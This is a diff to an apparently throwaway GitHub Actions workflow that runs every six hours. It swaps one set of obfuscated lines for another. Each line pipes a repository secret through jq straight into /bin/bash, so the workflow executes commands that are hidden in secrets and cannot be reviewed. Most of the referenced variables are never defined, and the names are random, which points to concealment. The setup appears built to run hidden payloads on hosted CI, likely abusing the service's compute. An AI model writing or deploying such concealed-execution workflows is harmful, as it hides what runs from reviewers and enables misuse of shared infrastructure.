@@ -2,24 +2,21 @@ name: yuehongdong1278
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-
-jobs:  # 27373
+    - cron: '26 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yuehongdong1278
         env:
-          seqr1: ${{ secrets.seqr1 }}
+          txg05: ${{ secrets.txg05 }}
         run: |
-          echo $seqr1 | jq -r .bcum87 | /bin/bash
-          echo $mctct0 | jq -r .kjo4 | /bin/bash
-          echo $cnv77 | jq -r .zfowg06766 | /bin/bash
-          echo $trwi722 | jq -r .rbsdg6091 | /bin/bash
-          echo $xv356 | jq -r .ph46271 | /bin/bash
-          echo $m220 | jq -r .vncbz2 | /bin/bash
-          echo $hcp9551 | jq -r .wvuk97 | /bin/bash
-          echo $vjqcz6158 | jq -r .ko2505 | /bin/bash
-          echo $nsx173 | jq -r .mwi13677 | /bin/bash
+          echo $txg05 | jq -r .mozb2 | /bin/bash
+          echo $ph978 | jq -r .xawx523 | /bin/bash
+          echo $wuazl5 | jq -r .uxqjz5104 | /bin/bash
+          echo $hscvd883 | jq -r .advwo963 | /bin/bash
+          echo $vy5690 | jq -r .tkzr3701 | /bin/bash
+          echo $panla2405 | jq -r .hnsc59842 | /bin/bash
 
